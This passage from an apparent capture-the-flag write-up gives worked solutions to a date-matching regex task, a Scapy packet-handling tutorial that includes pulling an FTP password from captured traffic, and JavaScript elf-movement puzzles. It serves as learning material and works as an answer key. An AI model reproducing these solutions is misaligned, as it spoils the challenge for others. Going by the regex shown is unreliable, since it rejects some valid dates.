</code></pre></div><ol start="8">
<li>Create A Regex That Matches Multiple Day, Month, and Year Date Formats Only
Create a regular expression that only matches one of the three following day, month, and four digit year formats:</li>
</ol>
<p>10/01/1978
01.10.1987
14-12-1991</p>
<p>However, the following values would be invalid formats:
05/25/89
12-32-1989
01.1.1989
1/1/1</p>
<p>Use anchors or boundary markers to avoid matching other surrounding strings.</p>
<p>We build a first group that will match the day and the month, as they have the same format:</p>
<ul>
<li><code>[1,0]{1}</code> : one digit that is either 1 or 0</li>
<li><code>\d</code>: any digit</li>
<li><code>[\/.-]{1}</code>: one punctuation sign like <code>/</code>, <code>.</code> or <code>-</code></li>
</ul>
<p>Putting it together: <code>([1,0]{1}\d[\/.-]{1}){2}</code> . For the year part,</p>
<ul>
<li>a <code>1</code></li>
<li>followed by any 3 digits</li>
</ul>
<p>Assembling the two groups, and adding <code>^</code> for beginning of the line and <code>$</code> for the end of line gives:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">^([1,0]{1}\d[\/.-]{1}){2}1\d{3}$
</code></pre></div><h2 id="terminal-scapy-prepper-alabaster-snowball">Terminal Scapy Prepper (Alabaster Snowball)</h2>
<p>Description:</p>
<p><img src="img/image-20201227101325918.png" alt="image-20201227101325918"></p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.get()
Welcome to the &#34;Present Packet Prepper&#34; interface! The North Pole could use your help prep
aring present packets for shipment.
Start by running the task.submit() function passing in a string argument of &#39;start&#39;.
Type task.help() for help on this question.

&gt;&gt;&gt; task.submit(&#39;start&#39;)
Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted()
</code></pre></div><blockquote>
<p>Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.</p>
</blockquote>
<p>The function for sending packets at layer 3 can be found in the documentation <a href="https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html#scapy.sendrecv.send">https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html#scapy.sendrecv.send</a></p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.submit(send)
Correct! The &#34;send&#34; scapy class will send a crafted scapy  packet out of a network interface.
</code></pre></div><blockquote>
<p>Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.</p>
</blockquote>
<p>On the same documentation page, we can also found the <code>sniff</code> function <a href="https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html#scapy.sendrecv.sniff">https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html#scapy.sendrecv.sniff</a>.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.submit(sniff)
Correct! the &#34;sniff&#34; scapy class will sniff network traffic and return these packets in a
list.
</code></pre></div><blockquote>
<p>Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named &ldquo;pkt&rdquo;:</p>
<ol>
<li>pkt = sr1(IP(dst=&ldquo;127.0.0.1&rdquo;)/TCP(dport=20))</li>
<li>pkt = sniff(IP(dst=&ldquo;127.0.0.1&rdquo;)/TCP(dport=20))</li>
<li>pkt = sendp(IP(dst=&ldquo;127.0.0.1&rdquo;)/TCP(dport=20))</li>
</ol>
</blockquote>
<p>Answer 2 will sniff a packet and not send anything. Answer 3 will send a packet but not care about the answer. Choice 1 is  the right one, <code>sr</code> means send/receive.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.submit(1)
Correct! sr1 will send a packet, then immediately sniff for a response packet.
</code></pre></div><blockquote>
<p>Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.</p>
</blockquote>
<p>Browsing the documentation, we found this section <a href="https://scapy.readthedocs.io/en/latest/usage.html?highlight=read%20pcap#reading-pcap-files">https://scapy.readthedocs.io/en/latest/usage.html?highlight=read%20pcap#reading-pcap-files</a>.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.submit(rdpcap)
Correct! the &#34;rdpcap&#34; scapy class can read pcap files.
</code></pre></div><blockquote>
<p>The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:</p>
<ol>
<li>UDP_PACKETS.print()</li>
<li>UDP_PACKETS.show()</li>
<li>UDP_PACKETS.list()</li>
</ol>
</blockquote>
<p><code>.list()</code> and <code>.print()</code> won&rsquo;t work on a list of packets, so the only possible answer is <code>.show()</code></p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.submit(2)
Correct! .show() can be used on lists of packets AND on an individual packet.
</code></pre></div><blockquote>
<p>Submit only the first packet found in UDP_PACKETS.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.submit(UDP_PACKETS[0])
Correct! Scapy packet lists work just like regular python lists so packets can be accessed
 by their position in the list starting at offset 0.
</code></pre></div><blockquote>
<p>Submit only the entire TCP layer of the second packet in TCP_PACKETS.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.submit(TCP_PACKETS[1][&#34;TCP&#34;])
Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw,
etc... can be accessed this way. Ex - pkt[IP][TCP]
</code></pre></div><blockquote>
<p>Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; UDP_PACKETS[0][&#34;IP&#34;].src = &#34;127.0.0.1&#34;
&gt;&gt;&gt; task.submit(UDP_PACKETS[0])
Correct! You can change ALL scapy packet attributes using this method.
</code></pre></div><blockquote>
<p>Submit the password &ldquo;task.submit(&lsquo;elf_password&rsquo;)&rdquo; of the user alabaster as found in the packet list TCP_PACKETS.</p>
</blockquote>
<p>We use a loop to print the Raw layer of each packet (if it has one)</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; for p in TCP_PACKETS:
...     if Raw in p:
...         p[Raw].show()
###[ Raw ]###
  load      = &#39;220 North Pole FTP Server\r\n&#39;
###[ Raw ]###
  load      = &#39;USER alabaster\r&#39;
###[ Raw ]###
  load      = &#39;331 Password required for alabaster.\r&#39;
###[ Raw ]###
  load      = &#39;PASS echo\r\n&#39;
###[ Raw ]###
  load      = &#39;230 User alabaster logged in.\r&#39;
&gt;&gt;&gt; task.submit(&#39;echo&#39;)
Correct! Here is some really nice list comprehension that will grab all the raw payloads f
rom tcp packets:
[pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]
</code></pre></div><blockquote>
<p>The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; ICMP_PACKETS[1][ICMP].chksum
19524
&gt;&gt;&gt; task.submit(ICMP_PACKETS[1][ICMP].chksum)
Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1]
[ICMP].chksum
</code></pre></div><blockquote>
<p>Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named &ldquo;pkt&rdquo;</p>
<ol>
<li>pkt = Ether(src=&lsquo;127.0.0.1&rsquo;)/ICMP(type=&ldquo;echo-request&rdquo;)</li>
<li>pkt = IP(src=&lsquo;127.0.0.1&rsquo;)/ICMP(type=&ldquo;echo-reply&rdquo;)</li>
<li>pkt = IP(dst=&lsquo;127.0.0.1&rsquo;)/ICMP(type=&ldquo;echo-request&rdquo;)</li>
</ol>
</blockquote>
<p>Answer 1 is wrong because it doesn&rsquo;t have an IP layer and answer 2 is an echo reply packet, not an echo request.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; task.submit(3)
Correct! Once you assign the packet to a variable named &#34;pkt&#34; you can then use that variable to send or manipulate your created packet.
</code></pre></div><blockquote>
<p>Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127 (all other packet attributes can be unspecified)</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; pkt = IP(dst=&#34;127.127.127.127&#34;) / UDP(dport=5000)
&gt;&gt;&gt; task.submit(pkt)
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst=&#34;127.127.127.127&#34;)/UDP(dport=5000)
task.submit(pkt)
</code></pre></div><blockquote>
<p>Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of &ldquo;elveslove.santa&rdquo;. (all other packet attributes can be unspecified)</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; pkt = IP(dst=&#34;127.2.3.4&#34;) / UDP(dport=53) / DNSQR(qname=&#34;elveslove.santa&#34;)
&gt;&gt;&gt; task.submit(pkt)
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst=&#34;127.2.3.4&#34;)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=&#34;elveslove.santa&#34;))
task.submit(pkt)
</code></pre></div><blockquote>
<p>The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.</p>
</blockquote>
<p>We first print the ARP request and the ARP response to see what&rsquo;s wrong with it.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; ARP_PACKETS.show()
0000 Ether / ARP who has 192.168.0.1 says 192.168.0.114
0001 Ether / ARP None 192.168.0.1 &gt; 192.168.0.114 / Padding
&gt;&gt;&gt; ARP_PACKETS[0].show()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = 00:16:ce:6e:8b:24
  type      = ARP
###[ ARP ]###
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = 6
     plen      = 4
     op        = who-has
     hwsrc     = 00:16:ce:6e:8b:24
     psrc      = 192.168.0.114
     hwdst     = 00:00:00:00:00:00
     pdst      = 192.168.0.1
&gt;&gt;&gt; ARP_PACKETS[1].show()
###[ Ethernet ]###
  dst       = 00:16:ce:6e:8b:24
  src       = 00:13:46:0b:22:ba
  type      = ARP
###[ ARP ]###
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = 6
     plen      = 4
     op        = None
     hwsrc     = ff:ff:ff:ff:ff:ff
     psrc      = 192.168.0.1
     hwdst     = ff:ff:ff:ff:ff:ff
     pdst      = 192.168.0.114
###[ Padding ]###
        load      = &#39;\xc0\xa8\x00r&#39;

</code></pre></div><p>The 3 incorrect fields are:</p>
<ul>
<li>the <code>op</code> field is None, it should be <code>is-at</code></li>
<li>hwsrc should not be ff:ff:ff:ff:ff:ff, but <code>00:13:46:0b:22:ba</code></li>
<li>hwdst should not be ff:ff:ff:ff:ff:ff but <code>00:16:ce:6e:8b:24</code></li>
</ul>
<p>Fixing it:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; ARP_PACKETS[1][ARP].op = &#34;is-at&#34;
&gt;&gt;&gt; ARP_PACKETS[1][ARP].hwdst = ARP_PACKETS[1][Ether].dst
&gt;&gt;&gt; ARP_PACKETS[1][ARP].hwsrc = ARP_PACKETS[1][Ether].src
&gt;&gt;&gt; task.submit(ARP_PACKETS)
Great, you prepared all the present packets!
Congratulations, all pretty present packets properly prepared for processing!
</code></pre></div><h2 id="arcade-the-elf-c0de-ribb-bonbowford">Arcade The Elf c0de (Ribb Bonbowford)</h2>
<p>Hint:</p>
<blockquote>
<p>From: Ribb Bonbowford
Want to learn a useful language? <a href="https://jgthms.com/javascript-in-14-minutes/">JavaScript</a> is a great place to start! You can also test out your code using a <a href="https://playcode.io/">JavaScript playground</a>.</p>
</blockquote>
<blockquote>
<p>JavaScript Loops
From: Ribb Bonbowford
Did you try the JavaScript primer? There&rsquo;s a great section on looping.</p>
</blockquote>
<blockquote>
<p>Filtering Items
From: Ribb Bonbowford
There&rsquo;s got to be a way to <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/filter">filter</a> for specific typeof items in an array. Maybe the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof">typeof</a> operator could also be useful?</p>
</blockquote>
<blockquote>
<p>Getting a Key Name
From: Ribb Bonbowford
<a href="https://stackoverflow.com/questions/9907419/how-to-get-a-key-in-a-javascript-object-by-its-value">In JavaScript you can enumerate an object&rsquo;s keys using keys, and filter the array using filter.</a></p>
</blockquote>
<blockquote>
<p>Compressing JS
From: Ribb Bonbowford
There are lots of ways to <a href="https://jscompress.com/">make your code shorter</a>, but the number of elf commands is key.</p>
</blockquote>
<blockquote>
<p>Adding to Arrays
From: Ribb Bonbowford
<code>var array = [2, 3, 4]; array.push(1)</code> doesn&rsquo;t do QUITE what was intended&hellip;</p>
</blockquote>
<h3 id="level-1---the-elf-c0de">Level 1 - The Elf C0de</h3>
<blockquote>
<p>Info:Program the elf to the end goal in no more than 2 lines of code and no more than 2 elf commands.</p>
</blockquote>
<p><img src="img/image-20210110110112369.png" alt="image-20210110110112369"></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></div><h3 id="level-2---trigger-the-yeeter">Level 2 - Trigger The Yeeter</h3>
<blockquote>
<p>Move to the lever, elf.get_lever(0), and manipulate the resulting data however it asks, and send the answer to elf.pull_lever(answer). The yeeter should release, and you can move freely.</p>
</blockquote>
<blockquote>
<p>Info:Program the elf to the end goal in no more than 5 lines of code and no more than 5 elf command/function execution statements in your code.</p>
</blockquote>
<p><img src="img/image-20210110110305406.png" alt="image-20210110110305406"></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lever</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">elf</span><span class="p">.</span><span class="nx">get_lever</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></div><h3 id="level-3---move-to-loopiness">Level 3 - Move To Loopiness</h3>
<blockquote>
<p>Pick up all of the lollipops!</p>
</blockquote>
<blockquote>
<p>Info:Program the elf to the end goal in no more than 4 lines of code and no more than 4 elf command/function execution statements in your code.</p>
</blockquote>
<p><img src="img/image-20210110110349979.png" alt="image-20210110110349979"></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div><h3 id="level-4---up-down-loopiness">Level 4 - Up Down Loopiness</h3>
<blockquote>
<p>Note: Using another for loop could reduce how many elf function statements are used.</p>
<p>Hint: Using elf.moveLeft(40) will move your elf as far as possible before hitting an obstacle or the end of the screen. Use however high a number you think you need!</p>
</blockquote>
<blockquote>
<p>Info:Program the elf to the end goal in no more than 7 lines of code and no more than 6 elf command/function execution statements in your code.</p>
</blockquote>
<p><img src="img/image-20210110110555011.png" alt="image-20210110110555011"></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveDown</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><h3 id="level-5---move-to-madness">Level 5 - Move To Madness</h3>
<blockquote>
<p>Hint
Experiment with the elf.moveTo() function. You might be able to get two-in-one if you move to munchkin[0].
Click on the munchkin in the CURRENT LEVEL OBJECTS window to see the kind of answer the munchkin is looking for in this challenge.</p>
</blockquote>
<blockquote>
<p>Info:Program the elf to the end goal in no more than 10 lines of code and no more than 5 elf command/function execution statements in your code..</p>
</blockquote>
<p><img src="img/image-20210110110700830.png" alt="image-20210110110700830"></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">list</span> <span class="o">=</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">ask_munch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">tell_munch</span><span class="p">(</span><span class="nx">list</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">item</span> <span class="p">=&gt;</span> <span class="nb">Number</span><span class="p">.</span><span class="nx">isInteger</span><span class="p">(</span><span class="nx">item</span><span class="p">)))</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div><h3 id="level-6---two-paths-your-choice">Level 6 - Two Paths, Your Choice</h3>
<blockquote>
<p>Note There are two paths here for you to choose. Choosing the lever may take more steps but might be easier to solve.</p>
</blockquote>
<blockquote>
<p>Info:Program the elf to the end goal in no more than 15 lines of code and no more than 7 elf command/function execution statements in your code.</p>
</blockquote>
<p><img src="img/image-20210110110748392.png" alt="image-20210110110748392"></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">get_lever</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nx">arr</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="s2">&#34;munchkins rule&#34;</span><span class="p">)</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lever</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveDown</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div><h3 id="level-7---yeeter-swirl-bonus">Level 7 - Yeeter Swirl [bonus]</h3>
<blockquote>
<p>About
Follow the swirl being careful not to step on any traps (or get yeeted off the map).</p>
</blockquote>
<blockquote>
<p>Note
elf.moveTo(object) has been disabled for this challenge.</p>
</blockquote>
<blockquote>
<p>Hint
Use loops and an incrementing count to take the exact number of steps.</p>
</blockquote>
<blockquote>
<p>Info:Program the elf to the end goal in no more than 25 lines of code and no more than 10 elf command/function execution statements in your code.</p>
</blockquote>
<p><img src="img/image-20201220200023921.png" alt="image-20201220200023921"></p>
<p>Winning semi-obfuscated 25 lines version:</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">current_lever</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
<span class="kd">function</span> <span class="nx">lever</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">current_lever</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">)</span>
<span class="p">}</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveDown</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
  <span class="nx">lever</span><span class="p">()</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
  <span class="nx">lever</span><span class="p">()</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span>
  <span class="nx">lever</span><span class="p">()</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveRight</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
  <span class="nx">lever</span><span class="p">()</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>

<span class="kd">function</span> <span class="nx">munch0</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
  	<span class="nx">total</span> <span class="o">+=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">filter</span><span class="p">(</span><span class="nx">item</span> <span class="p">=&gt;</span> <span class="nb">Number</span><span class="p">.</span><span class="nx">isInteger</span><span class="p">(</span><span class="nx">item</span><span class="p">)).</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">a</span> <span class="o">+</span> <span class="nx">b</span><span class="p">)</span>
  <span class="k">return</span> <span class="nx">total</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">tell_munch</span><span class="p">(</span><span class="nx">munch0</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div><h3 id="level-8---for-loop-finale-bonus">Level 8 - For Loop Finale [bonus]</h3>
<blockquote>
<p>About
Follow the zig-zag being careful not to step on any traps (or get yeeted off the map).
Note
The elf.moveTo(object) function has been disabled for this challenge.
Hint
Use loops and track incrementing values to take the exact number of steps.</p>
<p>Info:Program the elf to the end goal in no more than 40 lines of code and no more than 10 elf command/function execution statements in your code.</p>
</blockquote>
<p><img src="img/image-20201222215647529.png" alt="image-20201222215647529"></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">current_lever</span> <span class="o">=</span> <span class="mi">0</span>
<span class="nx">lever_sum</span> <span class="o">=</span> <span class="mi">0</span>

<span class="kd">function</span> <span class="nx">lever</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">lever_sum</span> <span class="o">+=</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">get_lever</span><span class="p">(</span><span class="nx">current_lever</span><span class="p">)</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">lever_sum</span><span class="p">)</span>
  <span class="nx">current_lever</span> <span class="o">+=</span> <span class="mi">1</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveRight</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nx">lever</span><span class="p">()</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">((</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
  <span class="k">if</span> <span class="p">((</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="c1">// 3 5 7 9 11
</span><span class="c1"></span>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nx">elf</span><span class="p">.</span><span class="nx">moveRight</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
  <span class="p">}</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
  <span class="nx">lever</span><span class="p">()</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="kd">function</span> <span class="nx">getKeyByValue</span><span class="p">(</span><span class="nx">object</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">object</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">key</span> <span class="p">=&gt;</span> <span class="nx">object</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">===</span> <span class="nx">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">munch0</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="nx">res</span> <span class="o">=</span> <span class="nx">getKeyByValue</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="s2">&#34;lollipop&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">res</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span><span class="p">)</span>
      <span class="k">return</span> <span class="nx">res</span>
  <span class="p">}</span>
<span class="p">}</span>

